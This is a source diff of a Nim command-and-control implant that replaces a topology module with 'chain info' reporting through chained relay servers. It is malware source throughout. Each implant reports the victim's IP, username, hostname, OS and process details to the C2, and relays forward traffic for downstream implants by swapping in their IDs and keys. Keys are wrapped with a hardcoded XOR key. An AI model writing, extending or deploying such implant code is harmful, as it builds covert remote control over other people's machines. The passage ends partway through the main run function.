@@ -13,7 +13,7 @@ from core/webClientListener import getStoredImplantID, storeImplantID
 from config/configParser import parseConfig, INITIAL_XOR_KEY
 import util/[strenc, sysinfo, crypto]
 import core/cmdParser
-import core/relay/[relay_protocol, relay_comm, relay_config, relay_topology]
+import core/relay/[relay_protocol, relay_comm, relay_config]
 import modules/relay/relay_commands
 # Import the global relay server from relay_commands to avoid conflicts
 from modules/relay/relay_commands import g_relayServer, getConnectionStats, broadcastMessage, sendToClient, getConnectedClients
@@ -24,6 +24,19 @@ export isRelayServer, relayServerPort, upstreamRelay, isConnectedToRelay
 
 # Re-export system info functions for compatibility
 export getLocalIP, getUsername, getSysHostname, getOSInfo, getCurrentPID, getCurrentProcessName
+
+# Function to determine relay role based on compilation parameters
+proc determineRelayRole*(): string =
+    const RELAY_ADDR {.strdefine.}: string = ""
+    
+    if RELAY_ADDR != "" and RELAY_ADDR.startsWith("relay://"):
+        when defined debug:
+            echo "[DEBUG] 🔍 Relay role determination: RELAY_CLIENT (RELAY_ADDRESS=" & RELAY_ADDR & ")"
+        return "RELAY_CLIENT"
+    else:
+        when defined debug:
+            echo "[DEBUG] 🔍 Relay role determination: STANDARD (no RELAY_ADDRESS)"
+        return "STANDARD"
 
 # ALL RELAY SERVER FUNCTIONS MOVED TO relay_commands.nim - USING SAFE PROTOCOL!
 
@@ -62,22 +75,49 @@ var
 # Global relay client encryption key for consistent messaging
 var g_relayClientKey: string = ""
 
-# Global relay server ID (fixed, generated once) - now in relay_topology module
-# var g_relayServerID: string = ""  # Moved to relay_topology module
+# Global relay server ID (fixed, generated once)
+var g_relayServerID: string = ""
 
-# Global topology tracking - now imported from relay_topology module
-
-# Generate fixed relay server ID - now in relay_topology module
-# Redirect to the module function
+# Generate fixed relay server ID - moved from relay_topology module
 proc getRelayServerID*(): string =
-    return relay_topology.getRelayServerID()
+    if g_relayServerID == "":
+        g_relayServerID = "RELAY-SERVER-" & $(rand(9999) + 1000)
+    return g_relayServerID
 
-# Helper functions for relay client ID management
+# Global relay client ID (for relay communication)
+var g_relayClientID: string = ""
+
+# Global variable to store the parent relay server GUID (for RELAY_CLIENT)
+var g_parentRelayServerGuid: string = ""
+
 proc getRelayClientID(): string =
-    return relay_topology.getRelayClientID()
+    return g_relayClientID
 
 proc setRelayClientID(clientID: string) =
-    relay_topology.setRelayClientID(clientID)
+    g_relayClientID = clientID
+
+proc setParentRelayServerGuid(guid: string) =
+    g_parentRelayServerGuid = guid
+    when defined debug:
+        echo "[DEBUG] 🔗 Chain Info: Set parent relay server GUID to: " & guid
+
+proc getParentRelayServerGuid(): string =
+    return g_parentRelayServerGuid
+
+# Helper function to extract parent GUID from relay server registration
+proc extractParentGuidFromRelayConnection(): string =
+    # When connected to relay server, we should get the relay server's GUID
+    # For now, we'll use a heuristic to extract it from the connection
+    if upstreamRelay.isConnected:
+        # Try to get it from stored relay server ID or connection info
+        # This should be populated during relay registration
+        if g_parentRelayServerGuid != "":
+            return g_parentRelayServerGuid
+        else:
+            when defined debug:
+                echo "[DEBUG] 🔗 Chain Info: Parent GUID not stored, needs relay server discovery"
+            return ""
+    return ""
 
 # Speed optimization constants - CLIENT-SIDE CONFIGURATION
 when defined(FAST_MODE):
@@ -519,8 +559,11 @@ proc httpHandler() {.async.} =
             let pid = getCurrentPID()
             let processName = getCurrentProcessName()
             
+            # Determine relay role based on compilation parameters
+            let relayRole = determineRelayRole()
+            
             webClientListener.postRegisterRequest(listener, localIP, username, hostname, 
-                                                 osInfo, pid, processName, false)
+                                                 osInfo, pid, processName, false, relayRole)
             
             when defined debug:
                 echo "[DEBUG] 🌐 HTTP Handler: Direct C2 registration completed"
@@ -556,7 +599,7 @@ proc httpHandler() {.async.} =
                 discard webClientListener.postRelayRegisterRequest(listener, registration.clientId, 
                                                           registration.localIP, registration.username, 
                                                           registration.hostname, registration.osInfo, 
-                                                          registration.pid, registration.processName, true)
+                                                          registration.pid, registration.processName, true, "RELAY_CLIENT")
                 
                 when defined debug:
                     echo "[DEBUG] 🌐 HTTP Handler: ✅ Relay registration forwarded to C2"
@@ -657,7 +700,7 @@ proc httpHandler() {.async.} =
                                     let (newId, newKey) = webClientListener.postRelayRegisterRequest(listener, registration.clientId, 
                                                                               registration.localIP, registration.username, 
                                                                               registration.hostname, registration.osInfo, 
-                                                                              registration.pid, registration.processName, true)
+                                                                              registration.pid, registration.processName, true, "RELAY_CLIENT")
                                     assignedId = newId
                                     encryptionKey = newKey
                                     
@@ -721,21 +764,25 @@ proc httpHandler() {.async.} =
                                     var responseData: JsonNode
                                     
                                     if encryptionKey != "":
-                                        # NEW REGISTRATION: Send both ID and encryption key
+                                        # NEW REGISTRATION: Send both ID and encryption key plus parent GUID
                                         responseData = %*{
                                             "id": assignedId,
-                                            "key": encryptionKey
+                                            "key": encryptionKey,
+                                            "parent_guid": listener.id  # Include relay server GUID as parent
                                         }
                                         when defined debug:
-                                            echo "[DEBUG] 🆕 HTTP Handler: Sending NEW ID and encryption key to client"
+                                            echo "[DEBUG] 🆕 HTTP Handler: Sending NEW ID, encryption key and parent GUID to client"
+                                            echo "[DEBUG] 🆕 HTTP Handler: Parent GUID (this relay server): " & listener.id
                                     else:
-                                        # RE-REGISTRATION: Send confirmation with existing ID (no new key)
+                                        # RE-REGISTRATION: Send confirmation with existing ID (no new key) plus parent GUID
                                         responseData = %*{
                                             "id": assignedId,
-                                            "status": "reconnected"
+                                            "status": "reconnected",
+                                            "parent_guid": listener.id  # Include relay server GUID as parent
                                         }
                                         when defined debug:
-                                            echo "[DEBUG] 🔄 HTTP Handler: Sending RE-REGISTRATION confirmation to client"
+                                            echo "[DEBUG] 🔄 HTTP Handler: Sending RE-REGISTRATION confirmation with parent GUID to client"
+                                            echo "[DEBUG] 🔄 HTTP Handler: Parent GUID (this relay server): " & listener.id
                                     
                                     let idMsg = createMessage(HTTP_RESPONSE,
                                         getRelayServerID(),
@@ -1038,69 +1085,79 @@ proc httpHandler() {.async.} =
                                 when defined debug:
                                     echo "[DEBUG] 🌐 HTTP Handler: ⚠️  Failed to send confirmation to client: " & msg.fromID
                         
-                        of TOPOLOGY_UPDATE:
-                            when defined debug:
-                                echo "[DEBUG] 🌐 HTTP Handler: Processing topology update from relay client"
-                            
-                            # Parse topology update
-                            let decryptedPayload = decryptPayload(msg.payload, msg.fromID)
-                            let (eventType, nodeInfo) = parseTopologyUpdate(decryptedPayload)
-                            
-                            when defined debug:
-                                echo "[DEBUG] 🌐 Topology: Event=" & eventType & ", Node=" & nodeInfo.nodeID
-                            
-                            # Update local topology and propagate to C2
-                            if not g_topologyInitialized:
-                                g_localTopology = initTopologyInfo(getRelayServerID())
-                                g_topologyInitialized = true
-                            
-                            updateNodeInTopology(g_localTopology, nodeInfo)
-                            
-                            # TODO: Send topology update to C2 server
-                            when defined debug:
-                                echo "[DEBUG] 🌐 Topology: Updated local topology with " & $g_localTopology.nodes.len & " nodes"
+
                         
-                        of TOPOLOGY_REQUEST:
+                        of CHAIN_INFO:
                             when defined debug:
-                                echo "[DEBUG] 🌐 HTTP Handler: Processing topology request from relay client"
+                                echo "[DEBUG] 🔗 HTTP Handler: ✅ CHAIN_INFO message received from relay client: " & msg.fromID
+                                echo "[DEBUG] 🔗 HTTP Handler: ✅ This is the CRITICAL message that should forward to C2"
+                                echo "[DEBUG] 🔗 HTTP Handler: Route: " & $msg.route
+                                echo "[DEBUG] 🔗 HTTP Handler: Payload length: " & $msg.payload.len
                             
-                            # Send current topology to requesting client
-                            if g_topologyInitialized:
-                                let topologyResponse = createTopologyResponseMessage(
-                                    getRelayServerID(),
-                                    @[msg.fromID, "RELAY-SERVER"],
-                                    g_localTopology
-                                )
+                            # Decrypt and parse chain info data (same as PULL message handling)
+                            let decryptedPayload = decryptPayload(msg.payload, msg.fromID)
+                            
+                            when defined debug:
+                                echo "[DEBUG] 🔗 HTTP Handler: Decrypted payload: " & decryptedPayload
+                            
+                            # Declare variables outside try block for exception handling
+                            var originalId = listener.id
+                            var originalKey = ""
+                            
+                            try:
+                                # Parse chain data for forwarding
+                                let chainData = parseJson(decryptedPayload)
+                                let implantID = chainData["implantID"].getStr()
+                                let parentGuid = chainData["parentGuid"].getStr()
+                                let role = chainData["role"].getStr()
+                                let listeningPort = chainData["listeningPort"].getInt()
                                 
-                                let success = relay_commands.sendToClient(g_relayServer, msg.fromID, topologyResponse)
                                 when defined debug:
-                                    if success:
-                                        echo "[DEBUG] 🌐 Topology: Sent topology response to " & msg.fromID
-                                    else:
-                                        echo "[DEBUG] 🌐 Topology: Failed to send topology response to " & msg.fromID
-                            else:
+                                    echo "[DEBUG] 🔗 Chain Info: ImplantID=" & implantID & ", Parent=" & parentGuid & ", Role=" & role & ", Port=" & $listeningPort
+                                    echo "[DEBUG] 🔗 Chain Info: ✅ Extracting REAL encryption key from chain info (like PULL messages)"
+                                
+                                # SAFE KEY SWAP: Extract and decrypt the REAL encryption key from chain info
+                                originalId = listener.id
+                                listener.id = msg.fromID
+                                
+                                # Extract and decrypt the relay client's REAL encryption key
+                                var clientKey: string
+                                if chainData.hasKey("key"):
+                                    let encryptedKey = chainData["key"].getStr()
+                                    clientKey = xorString(encryptedKey, INITIAL_XOR_KEY)
+                                    when defined debug:
+                                        echo "[DEBUG] 🔗 Chain Info: ✅ Extracted REAL encryption key from payload (length: " & $clientKey.len & ")"
+                                else:
+                                    # Fallback to derived key if no key in payload
+                                    clientKey = relay_config.getImplantKey(msg.fromID)
+                                    when defined debug:
+                                        echo "[DEBUG] 🔗 Chain Info: ⚠️  No key in payload, using derived key fallback"
+                                
+                                originalKey = safeKeySwap(listener, clientKey)
+                                
                                 when defined debug:
-                                    echo "[DEBUG] 🌐 Topology: No topology data available to send"
-                        
-                        of TOPOLOGY_RESPONSE:
-                            when defined debug:
-                                echo "[DEBUG] 🌐 HTTP Handler: Received topology response from relay client"
-                            
-                            # Parse and merge topology from downstream
-                            let decryptedPayload = decryptPayload(msg.payload, msg.fromID)
-                            let downstreamTopology = parseTopologyResponse(decryptedPayload)
-                            
-                            # Merge downstream topology into local topology
-                            if not g_topologyInitialized:
-                                g_localTopology = initTopologyInfo(getRelayServerID())
-                                g_topologyInitialized = true
-                            
-                            # Add all nodes from downstream topology
-                            for nodeID, nodeInfo in downstreamTopology.nodes:
-                                updateNodeInTopology(g_localTopology, nodeInfo)
-                            
-                            when defined debug:
-                                echo "[DEBUG] 🌐 Topology: Merged downstream topology, now have " & $g_localTopology.nodes.len & " total nodes"
+                                    echo "[DEBUG] 🔗 Chain Info: ✅ Key swap completed - impersonating relay client"
+                                
+                                # Forward chain info using normal postChainInfo (with correct encryption)
+                                webClientListener.postChainInfo(listener, implantID, parentGuid, role, listeningPort)
+                                
+                                when defined debug:
+                                    echo "[DEBUG] 🔗 Chain Info: ✅ Forwarded to C2 with correct encryption for: " & implantID
+                                
+                                # SAFE KEY RESTORATION: Restore original listener credentials
+                                listener.id = originalId
+                                safeKeyRestore(listener, originalKey)
+                                
+                            except Exception as e:
+                                when defined debug:
+                                    echo "[DEBUG] 🔗 Chain Info: ❌ Error forwarding chain info: " & e.msg
+                                # Ensure listener credentials are restored on error
+                                try:
+                                    listener.id = originalId
+                                    if originalKey != "":
+                                        safeKeyRestore(listener, originalKey)
+                                except:
+                                    discard
                         
                         of COMMAND, FORWARD, HTTP_REQUEST, HTTP_RESPONSE:
                             when defined debug:
@@ -1118,12 +1175,7 @@ proc httpHandler() {.async.} =
                     echo "└─────────────────────────────────────────────────────────"
                     echo ""
                 
-                # 1.5. TOPOLOGY DETECTION: Check for changes in relay client connections
-                if g_relayServer.isListening:
-                    relay_commands.detectTopologyChanges()
-                    when defined debug:
-                        let topologyStats = relay_commands.getCompleteTopology()
-                        echo "[DEBUG] 🌐 Topology: Monitoring " & $topologyStats.nodes.len & " nodes"
+                # 1.5. Legacy topology system removed - using distributed chain relationships
             
             # 2. Handle command results - send to C2
             for result in g_commandsToC2:
@@ -1211,42 +1263,104 @@ proc httpHandler() {.async.} =
                 if g_networkHealth.consecutiveErrors > 0:
                     echo "[DEBUG] 🚨 - Network experiencing issues, using backoff timing"
             
-            # 5. RELAY TOPOLOGY DETECTION AND REPORTING
+            # 5. CHAIN INFO REPORTING (New distributed topology approach)
             try:
-                # Detect topology changes every 5 seconds (adjust based on sleep time)
-                let shouldDetectTopology = true  # For testing - detect every cycle
+                # Report our chain info to C2 - much simpler than full topology
+                # For RELAY_CLIENT, send via relay server; for others, send directly to C2
+                let shouldSendChainInfo = if upstreamRelay.isConnected:
+                    # RELAY_CLIENT: Always send via relay (no need for C2 connection)
+                    true
+                else:
+                    # RELAY_SERVER/STANDARD: Send directly to C2 (need C2 connection)
+                    listener.initialized and listener.registered
                 
-                if shouldDetectTopology:
-                    when defined debug:
-                        echo "[DEBUG] 🌐 Topology: Running topology detection (cycle " & $httpCycleCount & ")"
-                    
-                    relay_commands.detectTopologyChanges()
-                    
-                    # If we have topology data to send, export it and send to C2
-                    if relay_topology.g_topologyInitialized:
-                        let topologyJson = relay_commands.exportTopologyJSON()
-                        if topologyJson != "":
-                            when defined debug:
-                                echo "[DEBUG] 🌐 Topology: Sending topology update to C2"
-                                echo "[DEBUG] 🌐 Topology: Data size: " & $topologyJson.len & " bytes"
+                if shouldSendChainInfo:
+                    # Check for immediate updates from relay commands
+                    if relay_commands.g_immediateChainInfoUpdate:
+                        when defined debug:
+                            echo "[DEBUG] 🔗 Chain Info: IMMEDIATE UPDATE requested"
+                        
+                        # Use pending chain info from relay command
+                        let (myRole, parentGuid, listeningPort) = relay_commands.g_pendingChainInfo
+                        
+                        webClientListener.postChainInfo(listener, listener.id, parentGuid, myRole, listeningPort)
+                        
+                        # Reset immediate update flag
+                        relay_commands.g_immediateChainInfoUpdate = false
+                        
+                        when defined debug:
+                            echo "[DEBUG] 🔗 Chain Info: ✅ IMMEDIATE update sent - Role=" & myRole & ", Parent=" & parentGuid & ", Port=" & $listeningPort
+                    else:
+                        # Determine our role and parent info for regular updates
+                        var myRole = "STANDARD"
+                        var parentGuid = ""
+                        var listeningPort = 0
+                        
+                        # Determine role based on relay server status and relay client connection
+                        if g_relayServer.isListening and upstreamRelay.isConnected:
+                            myRole = "RELAY_HYBRID"
+                            listeningPort = g_relayServer.port
+                            # TODO: Get parent GUID from upstream relay connection
+                        elif g_relayServer.isListening:
+                            myRole = "RELAY_SERVER"
+                            listeningPort = g_relayServer.port
+                            parentGuid = ""  # Direct to C2
+                        elif upstreamRelay.isConnected:
+                            myRole = "RELAY_CLIENT"
+                            # Use stored parent relay server GUID
+                            parentGuid = getParentRelayServerGuid()
                             
-                            # Send topology data to C2 via HTTP
-                            webClientListener.postTopologyUpdate(listener, topologyJson)
-                            
-                            when defined debug:
-                                echo "[DEBUG] 🌐 Topology: ✅ Topology update sent to C2"
+                            # CRITICAL FIX: If we don't have parent GUID yet, try to discover it
+                            if parentGuid == "":
+                                parentGuid = extractParentGuidFromRelayConnection()
+                                if parentGuid == "":
+                                    # Last resort: try to extract from g_parentRelayServerGuid
+                                    parentGuid = g_parentRelayServerGuid
+                                    when defined debug:
+                                        echo "[DEBUG] 🔗 Chain Info: Using fallback parent GUID: " & parentGuid
+                                else:
+                                    when defined debug:
+                                        echo "[DEBUG] 🔗 Chain Info: Extracted parent GUID: " & parentGuid
+                        else:
+                            myRole = "STANDARD"
+                            parentGuid = ""  # Direct to C2
+                        
+                        when defined debug:
+                            echo "[DEBUG] 🔗 Chain Info: Role=" & myRole & ", Parent=" & parentGuid & ", Port=" & $listeningPort
+                        
+                        # Send chain info to C2 (every few cycles to avoid spam)
+                        if httpCycleCount mod 10 == 1:  # Every 10th cycle
+                            if upstreamRelay.isConnected:
+                                # RELAY_CLIENT: Send via relay server
+                                let chainMsg = relay_protocol.createChainInfoMessage(
+                                    g_relayClientID,
+                                    @[g_relayClientID, g_parentRelayServerGuid],
+                                    parentGuid,
+                                    myRole,
+                                    listeningPort
+                                )
+                                let success = relay_comm.sendMessage(upstreamRelay, chainMsg)
+                                
+                                when defined debug:
+                                    if success:
+                                        echo "[DEBUG] 🔗 Chain Info: ✅ Regular update sent via RELAY SERVER"
+                                    else:
+                                        echo "[DEBUG] 🔗 Chain Info: ❌ Failed to send via relay server"
+                            else:
+                                # RELAY_SERVER/STANDARD: Send directly to C2
+                                webClientListener.postChainInfo(listener, listener.id, parentGuid, myRole, listeningPort)
+                                
+                                when defined debug:
+                                    echo "[DEBUG] 🔗 Chain Info: ✅ Regular update sent DIRECTLY to C2"
                         else:
                             when defined debug:
-                                echo "[DEBUG] 🌐 Topology: No topology data to send"
-                    else:
-                        when defined debug:
-                            echo "[DEBUG] 🌐 Topology: Topology not yet initialized"
+                                echo "[DEBUG] 🔗 Chain Info: Skipping cycle " & $httpCycleCount & " (sends every 10th)"
                 else:
                     when defined debug:
-                        echo "[DEBUG] 🌐 Topology: Skipping topology detection (cycle " & $httpCycleCount & ")"
-            except Exception as topoError:
+                        echo "[DEBUG] 🔗 Chain Info: Not registered yet, skipping"
+            except Exception as chainError:
                 when defined debug:
-                    echo "[DEBUG] 🌐 Topology: Error during topology detection: " & topoError.msg
+                    echo "[DEBUG] 🔗 Chain Info: Error: " & chainError.msg
             
             await sleepAsync(totalSleepMs)
             
@@ -1513,6 +1627,13 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                                 # NEW REGISTRATION: Has encryption key
                                 let encryptionKey = regResponse["key"].getStr()
                                 
+                                # Extract parent GUID if provided
+                                if regResponse.hasKey("parent_guid"):
+                                    let parentGuid = regResponse["parent_guid"].getStr()
+                                    setParentRelayServerGuid(parentGuid)
+                                    when defined debug:
+                                        echo "[DEBUG] 🔗 NEW REGISTRATION: Received parent GUID: " & parentGuid
+                                
                                 when defined debug:
                                     echo "[DEBUG] 🆕 ┌─────────── NEW REGISTRATION PATH ───────────┐"
                                     echo "[DEBUG] 🆕 │ Response HAS 'key' field - NEW registration │"
@@ -1542,6 +1663,14 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                                     echo "[DEBUG] 🆔 └─────────────────────────────────────────────────┘"
                             elif regResponse.hasKey("status") and regResponse["status"].getStr() == "reconnected":
                                 # RE-REGISTRATION: Confirmed existing ID, keep current encryption key
+                                
+                                # Extract parent GUID if provided  
+                                if regResponse.hasKey("parent_guid"):
+                                    let parentGuid = regResponse["parent_guid"].getStr()
+                                    setParentRelayServerGuid(parentGuid)
+                                    when defined debug:
+                                        echo "[DEBUG] 🔗 RE-REGISTRATION: Received parent GUID: " & parentGuid
+                                
                                 when defined debug:
                                     echo "[DEBUG] 🔄 ┌─────────── RE-REGISTRATION PATH ───────────┐"
                                     echo "[DEBUG] 🔄 │ Response HAS 'status: reconnected' - RE-registration │"
@@ -1625,59 +1754,7 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                     when defined debug:
                         echo "[DEBUG] 🔗 Relay Client: Received forwarded message"
                 
-                of TOPOLOGY_UPDATE:
-                    when defined debug:
-                        echo "[DEBUG] 🔗 Relay Client: Received topology update from upstream"
-                    
-                    # Parse and store topology update
-                    let decryptedPayload = decryptPayload(msg.payload, msg.fromID)
-                    let (eventType, nodeInfo) = parseTopologyUpdate(decryptedPayload)
-                    
-                    when defined debug:
-                        echo "[DEBUG] 🔗 Topology: Event=" & eventType & ", Node=" & nodeInfo.nodeID
-                    
-                    # Update local topology
-                    if not g_topologyInitialized:
-                        g_localTopology = initTopologyInfo(g_relayClientID)
-                        g_topologyInitialized = true
-                    
-                    updateNodeInTopology(g_localTopology, nodeInfo)
-                    
-                    when defined debug:
-                        echo "[DEBUG] 🔗 Topology: Updated local topology with " & $g_localTopology.nodes.len & " nodes"
-                
-                of TOPOLOGY_REQUEST:
-                    when defined debug:
-                        echo "[DEBUG] 🔗 Relay Client: Received topology request from upstream"
-                    
-                    # Send current topology to upstream
-                    if g_topologyInitialized:
-                        let topologyResponse = createTopologyResponseMessage(
-                            g_relayClientID,
-                            @[g_relayClientID, "RELAY-SERVER"],
-                            g_localTopology
-                        )
-                        
-                        let success = sendMessage(upstreamRelay, topologyResponse)
-                        when defined debug:
-                            if success:
-                                echo "[DEBUG] 🔗 Topology: Sent topology response to upstream"
-                            else:
-                                echo "[DEBUG] 🔗 Topology: Failed to send topology response"
-                    else:
-                        when defined debug:
-                            echo "[DEBUG] 🔗 Topology: No topology data available to send"
-                
-                of TOPOLOGY_RESPONSE:
-                    when defined debug:
-                        echo "[DEBUG] 🔗 Relay Client: Received topology response from upstream"
-                    
-                    # This would be unusual for a client to receive, but handle it
-                    let decryptedPayload = decryptPayload(msg.payload, msg.fromID)
-                    let upstreamTopology = parseTopologyResponse(decryptedPayload)
-                    
-                    when defined debug:
-                        echo "[DEBUG] 🔗 Topology: Received topology with " & $upstreamTopology.nodes.len & " nodes"
+
                 
                 else:
                     when defined debug:
@@ -1703,7 +1780,7 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                 echo "[DEBUG] 📡 ┌─────────── SENDING PULL REQUEST ───────────┐"
                 echo "[DEBUG] 📡 │ Sending PULL request for commands... │"
                 echo "[DEBUG] 📡 │ Client ID: " & g_relayClientID & " │"
-                echo "[DEBUG] 📡 │ Route: [" & g_relayClientID & ", RELAY-SERVER] │"
+                echo "[DEBUG] 📡 │ Route: [" & g_relayClientID & ", " & g_parentRelayServerGuid & "] │"
                 echo "[DEBUG] 🔑 │ Encrypting key with INITIAL_XOR_KEY │"
                 echo "[DEBUG] 🌐 │ Network RTT: " & $g_networkHealth.rtt.int & "ms, Multiplier: " & $g_networkHealth.adaptiveMultiplier & " │"
                 echo "[DEBUG] 📡 └─────────────────────────────────────────────┘"
@@ -1756,7 +1833,7 @@ proc relayClientHandler(host: string, port: int) {.async.} =
             
             let pullMsg = createMessage(PULL,
                 g_relayClientID,
-                @[g_relayClientID, "RELAY-SERVER"],
+                @[g_relayClientID, g_parentRelayServerGuid],
                 $pullPayload
             )
             
@@ -1798,6 +1875,72 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                 
                 # Force disconnect
                 upstreamRelay.isConnected = false
+            
+            # CRITICAL FIX: CHAIN INFO REPORTING for Relay Clients
+            # This was missing and is why relay clients never appear in topology
+            try:
+                when defined debug:
+                    echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: Debug vars - connected=" & $upstreamRelay.isConnected & ", clientID='" & g_relayClientID & "', parentGUID='" & g_parentRelayServerGuid & "'"
+                
+                if upstreamRelay.isConnected and g_relayClientID != "" and g_relayClientID != "PENDING-REGISTRATION":
+                    # CHANGED: Send more frequently for testing - every 3 cycles instead of 10
+                    if loopCount mod 3 == 1:
+                        let myRole = "RELAY_CLIENT"
+                        let parentGuid = g_parentRelayServerGuid
+                        let listeningPort = 0  # Relay clients don't listen
+                        
+                        when defined debug:
+                            echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: ✅ SENDING chain info - Cycle #" & $loopCount
+                            echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: Role=" & myRole & ", Parent='" & parentGuid & "', Port=" & $listeningPort
+                            echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: Client ID='" & g_relayClientID & "'"
+                        
+                        # ADDITIONAL DEBUG: Show if parent GUID is empty
+                        if parentGuid == "":
+                            when defined debug:
+                                echo "[DEBUG] 🚨 RELAY CLIENT CHAIN INFO: ⚠️  WARNING - Parent GUID is EMPTY!"
+                                echo "[DEBUG] 🚨 RELAY CLIENT CHAIN INFO: This might cause topology issues"
+                        
+                        # Create chain info with encryption key (same as PULL messages)
+                        let encryptedKey = xorString(g_relayClientKey, INITIAL_XOR_KEY)
+                        
+                        let chainData = %*{
+                            "implantID": g_relayClientID,
+                            "parentGuid": parentGuid,
+                            "role": myRole,
+                            "listeningPort": listeningPort,
+                            "key": encryptedKey,  # Include encryption key like PULL messages
+                            "timestamp": epochTime().int64
+                        }
+                        
+                        let chainMsg = createMessage(CHAIN_INFO, g_relayClientID,
+                            @[g_relayClientID, g_parentRelayServerGuid], $chainData)
+                        
+                        when defined debug:
+                            echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: Created CHAIN_INFO message, attempting to send..."
+                        
+                        let chainSuccess = relay_comm.sendMessage(upstreamRelay, chainMsg)
+                        
+                        when defined debug:
+                            if chainSuccess:
+                                echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: ✅ Chain info sent via RELAY SERVER"
+                                echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: ✅ This should be forwarded to C2 and appear in topology!"
+                            else:
+                                echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: ❌ Failed to send chain info via relay server"
+                                echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: ❌ Connection might be broken"
+                    else:
+                        when defined debug:
+                            echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: Skipping cycle " & $loopCount & " (sends every 3rd)"
+                else:
+                    when defined debug:
+                        echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: ❌ Preconditions not met:"
+                        if not upstreamRelay.isConnected:
+                            echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: - Not connected to relay server"
+                        if g_relayClientID == "" or g_relayClientID == "PENDING-REGISTRATION":
+                            echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: - Client not registered yet (ID: '" & g_relayClientID & "')"
+            except Exception as chainError:
+                when defined debug:
+                    echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: ❌ Exception: " & chainError.msg
+                    echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: ❌ Exception type: " & $chainError.name
             
             # Use adaptive polling interval based on network conditions
             let adaptiveInterval = getAdaptivePollingInterval()
@@ -1921,96 +2064,92 @@ proc runMultiImplant*() {.async.} =
         echo "[DEBUG] Current client mode: " & (if CLIENT_FAST_MODE: "FAST_MODE" else: "NORMAL")
         echo "[DEBUG] Server adaptive mode: " & (if g_serverFastMode: "FAST (1s)" else: "NORMAL (2s)")
     
-    # Check if compiled as relay client
-    when defined(RELAY_MODE):
-        const RELAY_ADDR {.strdefine.}: string = ""
-        
-        when defined debug:
-            echo "[DEBUG] RELAY MODE - Compiled as relay client"
-            echo "[DEBUG] Target relay address: " & RELAY_ADDR
-        
+    # Check if compiled as relay client by RELAY_ADDRESS
+    const RELAY_ADDR {.strdefine.}: string = ""
+    
+    when defined debug:
         if RELAY_ADDR != "":
-            # Parse relay address - strip quotes if present
-            let cleanRelayAddr = RELAY_ADDR.strip(chars = {'"'})
-            when defined debug:
-                echo "[DEBUG] Cleaned relay address: " & cleanRelayAddr
-            
-            if cleanRelayAddr.startsWith("relay://"):
-                let urlParts = cleanRelayAddr[8..^1].split(":")
-                if urlParts.len == 2:
-                    try:
-                        let host = urlParts[0]
-                        let port = parseInt(urlParts[1])
-                        
-                        when defined debug:
-                            echo "[DEBUG] Connecting to relay server: " & host & ":" & $port
-                        
-                        # Connect to upstream relay
-                        let result = connectToUpstreamRelay(host, port)
-                        
-                        when defined debug:
-                            echo "[DEBUG] Relay connection result: " & result
-                        
-                        if upstreamRelay.isConnected:
-                            when defined debug:
-                                echo "[DEBUG] ✅ Successfully connected to relay. Entering HYBRID mode."
-                                echo "[DEBUG] 🔗 HYBRID RELAY CLIENT MODE ACTIVATED"
-                                echo "[DEBUG] 📡 Running BOTH relay client AND HTTP handlers for multi-layer support"
-                                echo "[DEBUG] 🌐 HTTP handler: Can receive 'relay port' commands from C2"
-                                echo "[DEBUG] 📡 Relay client: Receives commands from upstream relay"
-                            
-                            # HYBRID MODE: Run both handlers simultaneously for multi-layer relay chains
-                            while true:
-                                try:
-                                    when defined debug:
-                                        echo "[MAIN] 🚀 Starting HYBRID mode handlers (relay client + HTTP)"
-                                    
-                                    # Start both handlers in parallel using asyncdispatch
-                                    let relayClientFuture = safeRelayClientHandler(host, port)
-                                    let httpHandlerFuture = safeHttpHandler()
-                                    
-                                    # Wait for either one to complete (they should run indefinitely)
-                                    await relayClientFuture or httpHandlerFuture
-                                    
-                                    when defined debug:
-                                        echo "[MAIN] 🔄 One of the handlers ended, restarting both in 5 seconds..."
-                                    
-                                    await sleepAsync(5000)  # Wait before restart
-                                except Exception as e:
-                                    when defined debug:
-                                        echo "[MAIN] 💥 Critical error in hybrid relay loop: " & e.msg
-                                    await sleepAsync(10000)  # Longer wait on critical error
-                        else:
-                            when defined debug:
-                                echo "[DEBUG] Failed to connect to relay. Exiting."
-                    except:
-                        when defined debug:
-                            echo "[DEBUG] Invalid relay address format"
-                        return
-                else:
+            echo "[DEBUG] RELAY CLIENT MODE - Compiled with relay address"
+            echo "[DEBUG] Target relay address: " & RELAY_ADDR
+        else:
+            echo "[DEBUG] STANDARD MODE - No relay address specified"
+    
+    if RELAY_ADDR != "":
+        # Parse relay address - strip quotes if present
+        let cleanRelayAddr = RELAY_ADDR.strip(chars = {'"'})
+        when defined debug:
+            echo "[DEBUG] Cleaned relay address: " & cleanRelayAddr
+        
+        if cleanRelayAddr.startsWith("relay://"):
+            let urlParts = cleanRelayAddr[8..^1].split(":")
+            if urlParts.len == 2:
+                try:
+                    let host = urlParts[0]
+                    let port = parseInt(urlParts[1])
+                    
                     when defined debug:
-                        echo "[DEBUG] Invalid port format in relay URL"
+                        echo "[DEBUG] Connecting to relay server: " & host & ":" & $port
+                    
+                    # Connect to upstream relay
+                    let result = connectToUpstreamRelay(host, port)
+                    
+                    when defined debug:
+                        echo "[DEBUG] Relay connection result: " & result
+                    
+                    if upstreamRelay.isConnected:
+                        when defined debug:
+                            echo "[DEBUG] ✅ Successfully connected to relay. Entering HYBRID mode."
+                            echo "[DEBUG] 🔗 HYBRID RELAY CLIENT MODE ACTIVATED"
